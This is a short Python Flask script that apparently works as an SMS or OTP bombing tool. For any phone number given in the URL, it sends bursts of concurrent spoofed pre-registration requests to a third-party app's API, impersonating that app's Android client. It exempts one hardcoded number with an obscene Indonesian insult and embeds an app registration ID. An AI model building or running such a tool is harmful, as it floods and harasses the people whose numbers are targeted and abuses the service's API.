from flask import Flask, request
import requests
from concurrent.futures import ThreadPoolExecutor
import os

app = Flask(__name__)

# Define a set of blocked phone numbers
blocked_numbers = {"082137021145", ""}

@app.route('/<phone>', methods=['GET'])
def handle_request(phone):
    if phone in blocked_numbers:
        return "ANAK BABI ANAK NGENTOT ANAK HARAM KAU SINI GELUD, GANTI NOMER JANGAN NOMER GUA ANJING", 403

    url = "https://mitratopserver.com/api/v2/pre-register"

    headers = {
        "Host": "mitratopserver.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/5.0.0-alpha.5"
    }

    data = {
        "c_rc": "1",
        "app_reg_id": "cZShztvjS0CXRwLe52v4rg:APA91bFNeOi9B78fXPG_kSA53NZzfgVjEOLAKxIwso-k9Oqd-wrJJjDkOz12QAOjSRS87d4KO-pg98Iq7cvxMa3sYKU_8249-J10DzRP4C9ywU84Pe9oFj6zIIvk2fgikgMhCsEascB8",
        "latitude": "",
        "c_rswa": "1",
        "c_rswe": "0",
        "c_h2w": "0",
        "token": "",
        "c_gg": "0",
        "c_pn": "1",
        "app_version_code": "230928",
        "c_rswa_e": "0",
        "phone": phone,  # Use the phone number from the URL
        "vss": "1",
        "app_version_name": "23.09.28",
        "ui_mode": "light",
        "longitude": ""
    }

    def single_request():
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            return "Sukses"
        else:
            return f"Request failed with status code: {response.status_code}"

    with ThreadPoolExecutor(max_workers=20000) as executor:
        futures = [executor.submit(single_request) for _ in range(50)]

        for future in futures:
            result = future.result()
            return result

if __name__ == '__main__':
    app.run(debug=True, port=int(os.getenv("PORT", 5000)))
